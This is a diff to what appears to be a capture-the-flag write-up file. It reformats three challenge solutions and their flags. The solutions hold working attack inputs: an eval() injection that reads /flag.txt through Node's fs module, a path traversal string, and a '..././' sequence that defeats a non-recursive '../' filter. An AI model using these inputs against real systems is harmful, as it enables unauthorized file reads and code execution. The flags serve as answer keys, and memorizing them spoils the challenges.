@@ -2151,7 +2151,13 @@ flag{wow_you_got_it!_lets_see_if_you_can_get_the_next_one...}
 - index.js
 
 ## Solution
-Our input is `eval()`ed. Submit `require('fs').readFileSync('/flag.txt').toString()` to get the flag.
+Our input is `eval()`ed. Submit
+
+```js
+require('fs').readFileSync('/flag.txt').toString()
+```
+
+to get the flag.
 
 ## Flag
 ```
@@ -2167,7 +2173,11 @@ flag{rce_is_a_fun_thing}
 - index.js
 
 ## Solution
-We can't start with `/`, so we just submit `../../../../../../../../../flag.txt`.
+We can't start with `/`, so we just submit
+
+```
+../../../../../../../../../flag.txt
+```
 
 ## Flag
 ```
@@ -2183,7 +2193,13 @@ flag{that_one_was_a_bit_harder_but_there_is_one_more...}
 - index.js
 
 ## Solution
-Now `../` is filtered out, but in a linear fashion. Submit `..././..././..././..././..././..././..././flag.txt` to get the flag.
+Now `../` is filtered out, but in a linear fashion. Submit
+
+```
+..././..././..././..././..././..././..././flag.txt
+```
+
+to get the flag.
 
 ## Flag
 ```
